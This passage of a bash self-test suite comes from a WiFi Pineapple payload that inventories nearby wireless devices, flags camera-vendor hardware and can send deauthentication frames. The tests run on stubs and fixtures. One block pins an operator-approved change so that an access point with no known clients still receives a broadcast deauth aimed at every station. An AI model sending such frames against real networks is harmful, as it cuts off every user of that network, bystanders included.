  st_hex2bin "d4c3b2a1020004000000000000000000$(st_le32h 65535)$(st_le32h 127)" >"$tmp/mem_arm.pcap"
  bss_clients "$tmp/mem_arm.pcap" "$BSSC" >/dev/null 2>&1; st "bss_clients: armed but silent rc" "$?" 0
  st "bss_clients: armed but silent has no records" "$(st_bss_key "$tmp/mem_arm.pcap" "$BSSC" RECS)" "0"
  # The union, on the shape real firmware returns: ap_mac is "-" for every row, so the membership
  # set is the only thing that can make the sweep find anyone.
  recon_lines() {
    printf '%s\n' \
      'ec:71:db:00:00:11|-|100|-50|-|2437|1700000000|6' \
      'ec:71:db:00:00:12|-|200|-60|-|2437|1700000000|6' \
      'ec:71:db:00:00:99|-|300|-70|-|2437|1700000000|6'
  }
  R_BSSID="$BSSC"; R_TARGET=ff:ff:ff:ff:ff:ff; R_CH=6; R_BAND=2
  RESP_MEMBERS=(); RESP_MEMBERS_BSS=''
  resp_snapshot bss
  st "snapshot bss: no association and no members finds nobody" "$(st_subjects)" ""
  RESP_MEMBERS=([ec:71:db:00:00:11]=1 [ec:71:db:00:00:12]=1); RESP_MEMBERS_BSS="$BSSC"
  resp_snapshot bss
  st "snapshot bss: members are subjects when ap_mac is -" "$(st_subjects)" \
     "ec:71:db:00:00:11 ec:71:db:00:00:12"
  RESP_MEMBERS=([ec:71:db:00:00:77]=1); RESP_MEMBERS_BSS="$BSSC"
  resp_snapshot bss
  st "snapshot bss: a member Recon has no row for is not invented" "$(st_subjects)" ""
  RESP_MEMBERS=([ec:71:db:00:00:11]=1); RESP_MEMBERS_BSS=aa:00:00:00:00:99
  resp_snapshot bss
  st "snapshot bss: a set gathered for another BSSID is ignored" "$(st_subjects)" ""
  # 7k-ii An AP row whose capture recovered NOBODY still fires its broadcast frame -- operator-decided
  # 2026-11-10 ("I'll accept nuclear blast. Let the AP row fire broadcast frames."). Before, this
  # refused with the capture's reason and sent nothing. Drives resp_fire itself, with the lock, the
  # capture and the command stubbed; recon_lines is still the ap_mac '-' stub above, so with an empty
  # member set the snapshot finds nobody, which is exactly the shape that used to refuse.
  local o_lock o_unlock o_mem o_settle="$RESP_SETTLE_SECS"; o_lock=$(declare -f lock_target)
  o_unlock=$(declare -f unlock_target); o_mem=$(declare -f resp_members)
  lock_target() { LOCK_TEXT=''; return 0; }; unlock_target() { :; }
  resp_members() { RESP_MEMBERS=(); RESP_MEMBERS_BSS=''; MEMBERS_WHY="${ST_WHY:-NO_CLIENTS}"; MEMBERS_TEXT="stub $MEMBERS_WHY"; return 1; }
  PINEAPPLE_DEAUTH_CLIENT() { printf '%s\n' "$*" >>"$tmp/fired"; [ -z "${ST_REFUSE:-}" ] || printf 'not permitted\n' >&2; }
  RESP_SETTLE_SECS=0; R_BSSID="$BSSC"; R_TARGET=ff:ff:ff:ff:ff:ff; R_CH=6; R_BAND=2
  rm -f "$tmp/fired" "$tmp/responses.tsv" "$tmp/events.log"
  resp_fire "$BSSC" DEAUTH 'D+C' >/dev/null 2>&1
  st "zero members, AP row: resp_fire reaches a verdict (rc 0)" "$?" 0
  st "zero members, AP row: the broadcast frame is sent, once, and no sweep" "$(cat "$tmp/fired" 2>/dev/null)" "$BSSC ff:ff:ff:ff:ff:ff 6"
  st "zero members, AP row: exactly one loot row" "$(grep -c '^[0-9]' "$tmp/responses.tsv" 2>/dev/null)" 1
  st "zero members, AP row: that row is the target, p0/p1 '-', INCONCLUSIVE" \
     "$(awk -F'|' 'NR == 2 { print $5, $14, $15, $16 }' "$tmp/responses.tsv" 2>/dev/null)" "ff:ff:ff:ff:ff:ff - - INCONCLUSIVE"
  st "zero members, AP row: no CMD_REFUSED and no NO_CLIENTS row" \
     "$(grep -cE '[|](CMD_REFUSED|NO_CLIENTS|NO_CAPTURE|SNAP_SHORT)$' "$tmp/responses.tsv" 2>/dev/null)" 0
  st "zero members, AP row: events.log says it fired with no members, and why" \
     "$(grep -c "fired DEAUTH $BSSC broadcast with no members recovered why=NO_CLIENTS" "$tmp/events.log" 2>/dev/null)" 1
  rm -f "$tmp/fired" "$tmp/responses.tsv" "$tmp/events.log"; ST_WHY=SNAP_SHORT
  resp_fire "$BSSC" DEAUTH 'D+C' >/dev/null 2>&1
  st "zero members, AP row: a SNAP_SHORT capture fires too and names its reason" \
     "$(grep -c "no-members $BSSC why=SNAP_SHORT" "$tmp/events.log" 2>/dev/null) $(awk -F'|' 'NR == 2 { print $16 }' "$tmp/responses.tsv" 2>/dev/null)" "1 INCONCLUSIVE"
  # the command refusal is NOT about membership and still refuses: CMD_REFUSED, no verdict row
  rm -f "$tmp/fired" "$tmp/responses.tsv" "$tmp/events.log"; ST_WHY=''; ST_REFUSE=1
  resp_fire "$BSSC" DEAUTH 'D+C' >/dev/null 2>&1
  st "zero members, AP row: a refused command is still CMD_REFUSED, rc 1, one row" \
     "$? $(grep -c '^[0-9]' "$tmp/responses.tsv" 2>/dev/null) $(awk -F'|' 'NR == 2 { print $16 }' "$tmp/responses.tsv" 2>/dev/null)" "1 1 CMD_REFUSED"
  # pins the 'fired' line BELOW the refusal gate: a refused command must not leave an events.log line
  # that reads as a transmission (review finding TF1, 2026-11-10)
  st "zero members, AP row: a refused command logs no 'fired ... with no members recovered' line" \
     "$(grep -c 'broadcast with no members recovered' "$tmp/events.log" 2>/dev/null)" 0
  unset ST_WHY ST_REFUSE; rm -f "$tmp/fired" "$tmp/responses.tsv" "$tmp/events.log"
  PINEAPPLE_DEAUTH_CLIENT() { :; }
  eval "$o_lock"; eval "$o_unlock"; eval "$o_mem"; RESP_SETTLE_SECS="$o_settle"
  eval "$orig_recon"
  RESP_MEMBERS=(); RESP_MEMBERS_BSS=''
  RS_PK=(); RS_T=(); R_BSSID=aa:00:00:00:00:10; R_TARGET=ff:ff:ff:ff:ff:ff; R_CH=6; R_BAND=2
  # 7e persistence: dedupe gate and the inventory loader
  DEDUPE_H=24; DEDUPE_RUN=1; CLOCK_OK=1; local K=aa:00:00:00:00:30
  SEEN_LAST[$K]=$((EPOCHSECONDS - 3600)); SEEN_CONF[$K]=90; SEEN_RSSI[$K]=-60; RSSI_LAST[$K]=-58
  dedupe_known $K 3; st "dedupe: known CONFIRMED within horizon is silent" "$?" 0
  SEEN_CONF[$K]=45; dedupe_known $K 3; st "dedupe: rank upgrade alerts" "$?" 1
  SEEN_CONF[$K]=90; RSSI_LAST[$K]=-48; dedupe_known $K 3; st "dedupe: 12 dB closer alerts" "$?" 1
  RSSI_LAST[$K]=-58; SEEN_LAST[$K]=$((EPOCHSECONDS - 90000)); dedupe_known $K 3; st "dedupe: expired horizon alerts" "$?" 1
  SEEN_LAST[$K]=$((EPOCHSECONDS - 3600)); DEDUPE_H=0; dedupe_known $K 3; st "dedupe: off by default" "$?" 1
  DEDUPE_H=24; CLOCK_OK=0; dedupe_known $K 3; st "dedupe: disabled on an invalid clock" "$?" 1
  CLOCK_OK=1; DEDUPE_H=0; unset "SEEN_LAST[$K]"
  printf '%s\n' "$INV_HDR" "1000|1000|r|aa:00:00:00:00:40|ap|SECURITY|X|HIK-OUI|90|90|0|-|2|s|-|6|2437|-60|1000|-60|N|7|-|HIK-OUI|-|-|-" \
    "$((EPOCHSECONDS - 100))|$((EPOCHSECONDS - 50))|r|aa:00:00:00:00:41|cli|MIXED|Y|TPL-MIX|20|20|0|-|2|s|-|6|2437|-70|1|-70|M|3|-|TPL-MIX|-|-|-" >"$tmp/inventory.tsv"
  LOADED_ROWS=0; load_inventory
  st "inventory: rows loaded" "$LOADED_ROWS" 2
  st "inventory: 30-day-old row pruned from memory" "${SEEN_LAST[aa:00:00:00:00:40]:-gone}" gone
  st "inventory: recent row keeps n_seen" "${SEEN_N[aa:00:00:00:00:41]}" 3
  st "inventory: old row pruned from the file" "$(grep -c '^[0-9]' "$tmp/inventory.tsv")" 1
  unset "SEEN_LAST[aa:00:00:00:00:41]" "SEEN_FIRST[aa:00:00:00:00:41]"
  local C=aa:00:00:00:00:42
  SEEN_FIRST[$C]=1700000000; SEEN_N[$C]=4; SEEN_RSSI[$C]=-50; SEEN_RSSI_TS[$C]=1700000500; SEEN_LAT[$C]=51.5; SEEN_LON[$C]=-0.1
  SEEN_BEH[$C]=55; SEEN_VERDICT[$C]=STREAM; SEEN_LAST[$C]=$((EPOCHSECONDS - 100)); unset "ROLE[$C]"
  record_seen $C ap "x" 6 2437 -70
  st "carry-over: first_seen and n_seen"        "${FIRST_SEEN[$C]} ${N_SEEN[$C]}" "1700000000 5"
  st "carry-over: stronger stored best kept"    "${RSSI_BEST[$C]} ${RSSI_BEST_TS[$C]}" "-50 1700000500"
  st "carry-over: stored fix kept"              "${LAT[$C]},${LON[$C]}" "51.5,-0.1"
  st "carry-over: behaviour evidence kept"      "${BEH[$C]} ${BEH_VERDICT[$C]} ${BEH_GATE[$C]}" "55 STREAM 55"
  record_seen $C ap "x" 6 2437 -40
  st "carry-over: a stronger reading still wins" "${RSSI_BEST[$C]}" "-40"
  # 7h recon-side review fixes: lock clamp, RSSI_MIN gate, settings table round trip
  RESP_SETTLE_SECS=6; RESP_LOCK_SECS=5; resp_clamp_lock; st "lock clamp: 5 s lock raised to settle + 5" "$RESP_LOCK_SECS" "11"
  RESP_LOCK_SECS=20; resp_clamp_lock; st "lock clamp: 20 s lock kept" "$RESP_LOCK_SECS" "20"
  RSSI_MIN=-50; RSSI_BEST[aa:00:00:00:00:01]=-58; rssi_gate_ok aa:00:00:00:00:01; st "rssi gate: below RSSI_MIN hidden" "$?" 1
  RSSI_BEST[aa:00:00:00:00:01]=-40; rssi_gate_ok aa:00:00:00:00:01; st "rssi gate: above RSSI_MIN listed" "$?" 0
  unset "RSSI_BEST[aa:00:00:00:00:99]"; rssi_gate_ok aa:00:00:00:00:99; st "rssi gate: no reading passes" "$?" 0
  RSSI_MIN=0; RSSI_BEST[aa:00:00:00:00:01]=-90; rssi_gate_ok aa:00:00:00:00:01; st "rssi gate: off by default" "$?" 0
  RSSI_MIN=60; rssi_min_clamp; st "rssi gate: positive RSSI_MIN is not dBm, gate off" "$RSSI_MIN" "0"
  RSSI_MIN=-65; RSSI_BEST[aa:00:00:00:00:7a]=-75; KITAP[aa:00:00:00:00:7a]=1; CLIENTS_OF[aa:00:00:00:00:7a]=" aa:00:00:00:00:7b"; KITCL[aa:00:00:00:00:7b]=1; RSSI_BEST[aa:00:00:00:00:7b]=-55
  rssi_gate_ok aa:00:00:00:00:7a; st "rssi gate: weak kit AP passes on a strong kit client" "$?" 0
  KITCL[aa:00:00:00:00:7b]=""; rssi_gate_ok aa:00:00:00:00:7a; st "rssi gate: weak AP with a non-kit client hidden" "$?" 1
  unset "KITAP[aa:00:00:00:00:7a]" "CLIENTS_OF[aa:00:00:00:00:7a]" "KITCL[aa:00:00:00:00:7b]" "RSSI_BEST[aa:00:00:00:00:7a]" "RSSI_BEST[aa:00:00:00:00:7b]"; RSSI_MIN=0
  RESP_SETTLE_SECS=6; RESP_LOCK_SECS=5; load_overrides; st "lock clamp runs with no persistence available" "$RESP_LOCK_SECS" "11"
  CFG_NOTE=" RESPONSE=1 CYCLE_SECS=9"; CFG_OVERRIDES=2; cfg_note_set CYCLE_SECS 7; st "settings: footer note tracks an applied key" "$CFG_OVERRIDES:$CFG_NOTE" "2: RESPONSE=1 CYCLE_SECS=7"
  cfg_note_set CYCLE_SECS ""; st "cfg_note_set: deleting one key keeps the others counted" "$CFG_OVERRIDES:$CFG_NOTE" "1: RESPONSE=1"; CFG_OVERRIDES=0; CFG_NOTE=""
  CYCLE_SECS=20; cfg_snapshot_defaults; CYCLE_SECS=7; st "settings: default captured" "${CFG_DEFAULT[CYCLE_SECS]}" "20"
  settings_row CYCLE_SECS; st "settings: recon table row" "$S_KIND $S_FLOOR $S_GROUP" "int 5 recon"
  settings_row RESP_LOCK_SECS; st "settings: response table row" "$S_KIND $S_FLOOR $S_GROUP" "int 5 response"
  settings_row NOSUCHKEY; st "settings: unknown key rc" "$?" 1
  local _k _f _miss=""   # every table key is a starred override load_overrides reads, with the same floor
  while IFS='|' read -r _k _ _f _; do
    [ -n "$_k" ] || continue
    [ "$(sed -n "s/^ *$_k=\$(cfg $_k \"\$$_k\" \(-\{0,1\}[0-9]*\)).*/\1/p" "${BASH_SOURCE[0]}")" = "$_f" ] || _miss+=" $_k"
  done <<<"$SETTINGS_TABLE"
  st "settings: every table key is read by load_overrides with the table's floor" "${_miss:-none}" "none"
  # ...and the other direction, which the check above cannot see: it walks the TABLE, so a starred
  # constant with no row passes it. Such a key can be set with PAYLOAD_SET_CONFIG and is then
  # invisible on the device: not shown in Settings, not put back by Reset defaults. A row for an
  # unstarred constant is the same lie told the other way. Found by a mutation that deleted one row
  # and left every check green.
  local _stars _rows
  _stars=$(sed -n '/^PAYLOAD_REL=/,/end config block ---/p' "${BASH_SOURCE[0]}" | sed -n 's/^\([A-Z][A-Z0-9_]*\)=[^#]*# \* .*/\1/p' | sort | tr '\n' ' ')
  _rows=$(printf '%s\n' "$SETTINGS_TABLE" | cut -d'|' -f1 | sort | tr '\n' ' ')
  st "settings: the starred constants of the config block and the table's keys are the same set" "$_stars" "$_rows"
  st "settings: twenty of them (when this moves, so do CLAUDE.md's code map and the README's Configuration section)" \
     "$(printf '%s' "$_stars" | wc -w | tr -d ' ')" "20"
  # 7j band write: plan from the uci value, trust the write only on read-back, restore what was there
  st "bands plan: adds 6"             "$(bands_plan 2,5)"   "2 5 6"
  st "bands plan: already has 6"      "$(bands_plan 2,5,6)" ""
  st "bands plan: single band"        "$(bands_plan 5)"     "5 6"
  st "bands plan: unreadable"         "$(bands_plan "")"    ""
  local _rif=$RECON_IF _bl=$BANDS_LINE _bn=$BANDS_PROBE_N _bw=$BANDS_PROBE_WAIT _bs=$BANDS_STATE _rc; RECON_IF=wlan9mon; BANDS_ORIG=""; BANDS_WROTE=""; : >"$tmp/bands.log"; printf '2,5' >"$tmp/bands"; BANDS_STATE="$tmp/bands_orig"
  BANDS_PROBE_N=2; BANDS_PROBE_WAIT=0.05
  uci() { cat "$tmp/bands"; }
  iw() { if grep -q 6 "$tmp/bands"; then echo 'channel 37 (5975 MHz), width: 20 MHz'; else echo 'channel 6 (2437 MHz), width: 20 MHz'; fi; }
  PINEAPPLE_SET_BANDS() { printf '%s\n' "$*" >>"$tmp/bands.log"; local IFS=,; printf '%s' "${*:2}" >"$tmp/bands"; }
  bands_apply; st "bands apply: writes current + 6"      "$(sed -n 1p "$tmp/bands.log")" "wlan9mon 2 5 6"
  st "bands apply: remembers the original"               "$BANDS_ORIG:$BANDS_LINE" "2,5:2,5,6"
  st "bands apply: the undo record names the bands and this run" "$(cat "$BANDS_STATE")" "2,5 $MAIN_PID"
  bands_apply; st "bands apply: once per run"            "$(wc -l <"$tmp/bands.log" | tr -d ' ')" "1"
  bands_restore; st "bands restore: puts the original back" "$(sed -n 2p "$tmp/bands.log"):$BANDS_ORIG" "wlan9mon 2 5:"
  st "bands restore: status line follows"                "$BANDS_LINE" "2,5 (6 GHz not scanned)"
  printf '2,5,6' >"$tmp/bands"; BANDS_LINE="2,5,6"; printf '2,5 999\n' >"$BANDS_STATE"; bands_recover
  st "bands recover: a record left by a killed run is replayed, whoever wrote it, and removed" "$(sed -n 3p "$tmp/bands.log"):$([ -e "$BANDS_STATE" ] && echo file || echo none)" "wlan9mon 2 5:none"
  st "bands recover: the status line follows the restored bands" "$BANDS_LINE" "2,5 (6 GHz not scanned)"
  printf 'junk\n' >"$BANDS_STATE"; bands_recover; st "bands recover: an unreadable record is dropped, nothing written" "$(wc -l <"$tmp/bands.log" | tr -d ' '):$([ -e "$BANDS_STATE" ] && echo file || echo none)" "3:none"
  PINEAPPLE_SET_BANDS() { printf '%s\n' "$*" >>"$tmp/bands.log"; }   # a write that does not take
  pidof() { echo "p${EPOCHREALTIME/./}"; }   # pineapd "restarts" across the write: a different pid on every call (called in $( ), so no counter survives)
  bands_apply; st "bands apply: not trusted unless 6 GHz is seen live or in uci" "$BANDS_ORIG:$BANDS_LINE" ":2,5 (6 GHz not scanned)"
  unset -f pidof; st "bands apply: a pineapd restart is reported even when the write is not trusted" "$(grep -c 'pineapd restarted by the band write' "$tmp/events.log")" "1"
  st "bands apply: an issued write is remembered on disk even when untrusted" "$BANDS_WROTE:$(cut -d' ' -f1 "$BANDS_STATE")" "2,5:2,5"
  bands_restore; st "bands restore: an untrusted write is restored anyway, record gone" "$(sed -n 5p "$tmp/bands.log"):$BANDS_WROTE:$([ -e "$BANDS_STATE" ] && echo file || echo none)" "wlan9mon 2 5::none"
  BANDS_ORIG=""; BANDS_WROTE=""; printf '2,5' >"$tmp/bands"; bands_apply; CONFIRMATION_DIALOG() { echo 1; }; settings_reset >/dev/null 2>&1; CONFIRMATION_DIALOG() { return 1; }   # restore the declining stub, never unset it
  st "settings reset: BAND6 back at 0 restores an issued write" "$(sed -n 7p "$tmp/bands.log"):$BAND6:$BANDS_WROTE" "wlan9mon 2 5:0:"
  uci() { echo '2,5'; }; iw() { echo 'channel 37 (5975 MHz), width: 20 MHz'; }   # applied at runtime, uci untouched
  bands_apply; st "bands apply: a live 6 GHz channel is enough, uci lagging" "$BANDS_ORIG:$BANDS_LINE" "2,5:2,5,6"
  BANDS_ORIG=""; BANDS_WROTE=""; BANDS_STATE="/proc/camhound-selftest-nowhere/bands"; bands_apply; _rc=$?
  st "bands apply: no undo record, no write" "$_rc:$BANDS_WROTE:$(wc -l <"$tmp/bands.log" | tr -d ' ')" "1::8"
  BANDS_ORIG=""; BANDS_WROTE=""; unset -f uci iw; PINEAPPLE_SET_BANDS() { :; }; RECON_IF=$_rif; BANDS_LINE=$_bl; BANDS_PROBE_N=$_bn; BANDS_PROBE_WAIT=$_bw; BANDS_STATE=$_bs
  RESP_SETTLE_SECS=6; RESP_LOCK_SECS=20; CFG_NOTE=""; CFG_OVERRIDES=0
  settings_apply RESP_LOCK_SECS 5; st "settings: a short lock is clamped on apply and the clamp is what gets counted" "$RESP_LOCK_SECS:$CFG_NOTE" "11: RESP_LOCK_SECS=11"
  settings_apply RESP_SETTLE_SECS 20; st "settings: raising settle re-clamps the lock" "$RESP_LOCK_SECS:$CFG_NOTE" "25: RESP_SETTLE_SECS=20 RESP_LOCK_SECS=25"
  RESP_LOCK_SECS=20; RESP_SETTLE_SECS=6; CFG_NOTE=""; CFG_OVERRIDES=0
  # 7i client rows in the 2.0.0 shape: probes are the values of a hash-keyed object, and nothing carries the association
  local cj='[{"mac":"AA:BB:CC:00:00:01","time":1700000000,"signal":-57,"freq":2437,"packets":12,"probe":{"2918451234":{"ssid":"HomeNet","ssidlen":7,"count":3,"time":1700000005,"signal":-55,"freq":2437,"channel":6},"77":{"ssid":"Cam|Net","ssidlen":7,"count":1,"time":1700000001,"signal":-60,"freq":2437,"channel":6},"3":{"ssid":"","ssidlen":0,"count":9,"time":1700000003,"signal":-58,"freq":2437,"channel":6}}},{"mac":"AA:BB:CC:00:00:02","time":1700000002,"signal":-70,"freq":5180,"packets":3}]'
  if command -v jq >/dev/null 2>&1; then
    st "cli jq: probe object -> probed SSIDs (wildcard dropped), association unknown" "$(printf '%s' "$cj" | jq -r "$JQ_CLI" | sed -n 1p)" "AA:BB:CC:00:00:01|-|12|-57|HomeNet,Cam_Net|2437|1700000000|0"
    st "cli jq: client with no probe object" "$(printf '%s' "$cj" | jq -r "$JQ_CLI" | sed -n 2p)" "AA:BB:CC:00:00:02|-|3|-70||5180|1700000002|0"
    # Separator sanitisation without gsub. The device's jq has no Oniguruma, so gsub is undefined
    # there and the whole program emitted nothing; split/1 is a literal split and needs no regex.
    # All five separators in one SSID, so a reintroduced gsub or a missed character is caught here.
    st "cli jq: every separator collapses without a regex" \
       "$(printf '%s' '[{"mac":"aa","probe":{"1":{"ssid":"a|b;c,d"}}}]' | jq -r "$JQ_CLI")" \
       "aa|-|0|-|a_b_c_d|0|0|0"
    # The AP program on the probe's own fixture: two beacon entries and a response, so the
    # best-signal pick (sort_by, last), max, the empty-SSID skip and any all run. The expected row
    # is what the program printed, taken once and pinned, not derived by reading it.
    st "aps jq: best signal wins, an empty SSID is skipped, separators collapse without a regex" \
       "$(printf '%s' '[{"mac":"cc","packets":9,"beacon":{"1":{"ssid":"","signal":-70,"channel":1,"freq":2412,"hidden":false,"time":3},"2":{"ssid":"Net;A","signal":-40,"channel":11,"freq":2462,"hidden":false,"time":9}},"response":{"3":{"ssid":"Net;A","signal":-45,"channel":11,"freq":2462,"time":8}}}]' | jq -r "$JQ_APS")" \
       "cc|9|Net_A|11|2462|-40|0|9"
    # A functional probe, not a presence probe. A jq that exists but cannot run our program must
    # leave HAVE_JQ at 0 so the fallback parsers are used, rather than silently yielding no rows.
    jq_works; st "jq probe: a working jq is accepted" "$?" 0
    jq() { return 3; }
    jq_works; st "jq probe: a jq that fails our program is refused" "$?" 1
    jq() { printf 'unexpected\n'; }
    jq_works; st "jq probe: a jq whose output is wrong is refused" "$?" 1
    # JQ_APS uses builtins JQ_CLI never touches, so the probe runs both: a jq that gets the client
    # row right and the AP row wrong must still leave HAVE_JQ at 0.
    jq() { case "$*" in *"$JQ_APS"*) printf 'unexpected\n' ;; *) printf 'aa|-|0|-|c_d|0|0|0\n' ;; esac; }
    jq_works; st "jq probe: a jq that runs the client program but not the AP one is refused" "$?" 1
    unset -f jq
  fi
  local dj='[{"beacon":{"3488417929":{"channel":1,"count":269148,"freq":2412,"hidden":false,"signal":-61,"ssid":"Lab AP","ssidlen":6,"time":1700000000}},"freq":2412,"mac":"AA:BB:CC:00:00:10","packets":325816,"probe":{"25061":{"channel":10,"count":3142,"freq":2457,"signal":-68,"ssid":"","ssidlen":0,"time":1700000000}},"response":{"5550":{"channel":1,"count":53526,"freq":2412,"signal":-63,"ssid":"Lab AP","ssidlen":6,"time":1700000000}},"signal":-61,"time":1700000000},{"freq":2437,"mac":"AA:BB:CC:00:00:01","packets":12,"probe":{"2918451234":{"channel":6,"count":3,"freq":2437,"signal":-55,"ssid":"HomeNet","ssidlen":7,"time":1700000005}},"signal":-57,"time":1700000000}]'
  if command -v jq >/dev/null 2>&1; then
    st "cli jq via DEVICES: an AP that also probes is not a client" "$(printf '%s' "$dj" | jq -r "$JQ_DEVCLI" | tr '\n' ' ')" "AA:BB:CC:00:00:01|-|12|-57|HomeNet|2437|1700000000|0 "
  fi
  local ej='[{"beacon":{},"freq":2437,"mac":"AA:BB:CC:00:00:02","packets":5,"probe":{"9":{"channel":6,"count":1,"freq":2437,"signal":-60,"ssid":"Net2","ssidlen":4,"time":1700000001}},"response":{},"signal":-60,"time":1700000001},{"freq":2412,"mac":"AA:BB:CC:00:00:11","packets":9,"response":{"5550":{"channel":1,"count":2,"freq":2412,"signal":-63,"ssid":"Lab AP","ssidlen":6,"time":1700000000}},"signal":-63,"time":1700000000}]'
  if command -v jq >/dev/null 2>&1; then st "cli jq via DEVICES: empty beacon/response objects are still a client; a response-only AP is not" "$(printf '%s' "$ej" | jq -r "$JQ_DEVCLI" | tr '\n' ' ')" "AA:BB:CC:00:00:02|-|5|-60|Net2|2437|1700000001|0 "; fi
  st "cli fallback via DEVICES: empty beacon/response objects are still a client; a response-only AP is not" "$(printf '%s' "$ej" | parse_cli_fallback | tr '\n' ' ')" "AA:BB:CC:00:00:02|-|5|-60|Net2|2437|1700000001|0 "
  st "cli fallback via DEVICES: same one row" "$(printf '%s' "$dj" | parse_cli_fallback | tr '\n' ' ')" "AA:BB:CC:00:00:01|-|12|-57|HomeNet|2437|1700000000|0 "
  st "cli fallback: same rows as jq from the same shape" "$(printf '%s' "$cj" | parse_cli_fallback | tr '\n' ' ')" "AA:BB:CC:00:00:01|-|12|-57|HomeNet,Cam_Net|2437|1700000000|0 AA:BB:CC:00:00:02|-|3|-70||5180|1700000002|0 "
  # 7m association: station -> BSSID, the inverse of the membership walk. No firmware supplies a
  # client's AP, so it is read off the air on demand (assoc_lookup), kept for the run and re-applied
  # by run_cycle. The pcap is st_data_pcap's -- the frames the membership cases walk -- so the two
  # directions are held to one fixture.
  local ASH=ec71db000010 ASB=ec:71:db:00:00:10 AS1=ec:71:db:00:00:11 AS3=ec:71:db:00:00:13 AS4=ec:71:db:00:00:14
  local _a _bad="" _f2 _oi _ow _ol _ou _oc _cf="$CHILD_FILE" _secs=$ASSOC_CAP_SECS _ttl=$ASSOC_TTL _tcp=$HAVE_TCPDUMP
  for _a in 2412:1 2437:6 2472:13 2484:14 5180:36 5825:165 5955:0 2413:0 5181:0 junk:0 :0; do
    chan_of_freq "${_a%%:*}"; [ "$CHAN_V" = "${_a##*:}" ] || _bad+=" ${_a%%:*}->$CHAN_V"
  done
  st "chan_of_freq: 2.4 and 5 GHz centres map; 6 GHz, off-grid and junk stay 0" "${_bad:-none}" "none"
  st_data_pcap "$tmp/asc.pcap" "$ASH"; st_data_pcap "$tmp/asc_be.pcap" "$ASH" be
  st "pairs: every station with the BSSID it talks to, ToDS and FromDS alike" "$(st_pairs "$tmp/asc.pcap")" \
     "$AS1>$ASB=3 ec:71:db:00:00:12>$ASB=2 $AS4>$ASB=2"
  st "pairs: one station asked for, found on its ToDS frames" "$(st_pairs "$tmp/asc.pcap" "$AS1")" "$AS1>$ASB=3"
  st "pairs: a station heard only on FromDS frames is found through addr1" \
     "$(st_pairs "$tmp/asc.pcap" ec:71:db:00:00:12)" "ec:71:db:00:00:12>$ASB=2"
  st "pairs: one sighting is not a pair"              "$(st_pairs "$tmp/asc.pcap" "$AS3")" ""
  st "pairs: a beacon's source is not a station"      "$(st_pairs "$tmp/asc.pcap" ec:71:db:00:00:15)" ""
  st "pairs: big-endian pcap, little-endian radiotap" "$(st_pairs "$tmp/asc_be.pcap")" \
     "$AS1>$ASB=3 ec:71:db:00:00:12>$ASB=2 $AS4>$ASB=2"
  OWN_MACS=" $AS1 "
  st "pairs: one of our own MACs is never a station"  "$(st_pairs "$tmp/asc.pcap")" "ec:71:db:00:00:12>$ASB=2 $AS4>$ASB=2"
  OWN_MACS=" $ASB "
  st "pairs: nor a BSSID"                             "$(st_pairs "$tmp/asc.pcap")" ""
  OWN_MACS=" "
  st "pairs: the membership walk beside it is unchanged" "$(st_members "$tmp/asc.pcap" "$ASB")" "$AS1 ec:71:db:00:00:12 $AS4"
  # lock_channel: EXAMINE_CHANNEL alone has never been issued on a device, so the park is read back
  # and nothing is assumed. rc 3 is lock_target's rc 3: unverified, and the caller proceeds.
  _oi=$(declare -f iwinfo); _ow=$(declare -f iw)
  sleep() { :; }; iw() { :; }
  PINEAPPLE_EXAMINE_CHANNEL() { printf '%s\n' "$*" >>"$tmp/exch"; }
  iwinfo() { printf '          Channel: 6 (2.437 GHz)\n'; }
  : >"$tmp/exch"; lock_channel 6 9 >/dev/null
  st "lock_channel: issues the channel lock, and three samples on it are a park" "$?:$(cat "$tmp/exch")" "0:6 9"
  iwinfo() { printf '          Channel: 1 (2.412 GHz)\n'; }
  lock_channel 6 9 >/dev/null
  st "lock_channel: a radio that is somewhere else is rc 2, with the samples it read" \
     "$?:$(printf '%s' "$LOCK_TEXT" | grep -c 'samples 1/1/1')" "2:1"
  : >"$tmp/chseq"
  iwinfo() { printf 'x' >>"$tmp/chseq"; [ "$(wc -c <"$tmp/chseq" | tr -d ' ')" != 1 ] && printf '          Channel: 6 (2.437 GHz)\n'; return 0; }
  lock_channel 6 9 >/dev/null
  st "lock_channel: one unreadable sample beside two on the channel is still a park" "$?" 0
  : >"$tmp/chseq"
  iwinfo() { printf 'x' >>"$tmp/chseq"; [ "$(wc -c <"$tmp/chseq" | tr -d ' ')" = 3 ] && printf '          Channel: 6 (2.437 GHz)\n'; return 0; }
  lock_channel 6 9 >/dev/null
  st "lock_channel: ONE readable sample is rc 3: unverified, and the caller proceeds" \
     "$?:$(printf '%s' "$LOCK_TEXT" | grep -c unverified)" "3:1"
  iwinfo() { :; }
  lock_channel 6 9 >/dev/null
  st "lock_channel: no read-back at all is rc 3, never a park" "$?" 3
  PINEAPPLE_EXAMINE_CHANNEL() { printf 'ERROR: bad channel\n' >&2; }
  rm -f "$tmp/events.log"; lock_channel 6 9 >/dev/null
  st "lock_channel: the command's stderr is logged, because its rc is 0 on every path" \
     "$(grep -c 'EXAMINE_CHANNEL 6 said: ERROR: bad channel' "$tmp/events.log" 2>/dev/null)" "1"
  PINEAPPLE_EXAMINE_CHANNEL() { :; }
  # assoc_lookup's decisions, with the lock and the capture stubbed so each case is one fixture
  _ol=$(declare -f lock_channel); _ou=$(declare -f unlock_target); _oc=$(declare -f assoc_capture)
  lock_channel() { printf '%s\n' "$1" >>"$tmp/locks"; LOCK_TEXT="stub lock rc ${ST_LRC:-0}"; return "${ST_LRC:-0}"; }
  unlock_target() { printf 'u' >>"$tmp/unlocks"; }
  assoc_capture() { printf '%s %s\n' "$1" "$2" >>"$tmp/caps"; [ -s "${ST_PCAP:-}" ] || return 1; cp "$ST_PCAP" "$tmp/asc_run.pcap"; printf '%s' "$tmp/asc_run.pcap"; }
  HAVE_TCPDUMP=1; ASSOC_CAP_SECS=4; ASSOC_TTL=300
  ASSOC_BSS=(); ASSOC_CH=(); ASSOC_TS=(); ASSOC_TRY=(); ASSOC_SRC=()
  st_device "$ASB" ap "Reolink Innovation Limited" "ReoKit" 0; CH[$ASB]=36
  st_device "$AS1" cli "Reolink Innovation Limited" "" 0; FREQ[$AS1]=5180; unset "CH[$AS1]"
  st "assoc: a client the firmware gave no AP for can be looked up" "$(assoc_can "$AS1" && echo yes)" "yes"
  rm -f "$tmp/events.log" "$tmp/caps" "$tmp/unlocks" "$tmp/locks"; ST_PCAP="$tmp/asc.pcap"; ST_LRC=0
  BASELINE_NEXT=0; PREV_PKT=(); PREV_PKT[$ASB]=5
  assoc_lookup "$AS1" >/dev/null 2>&1
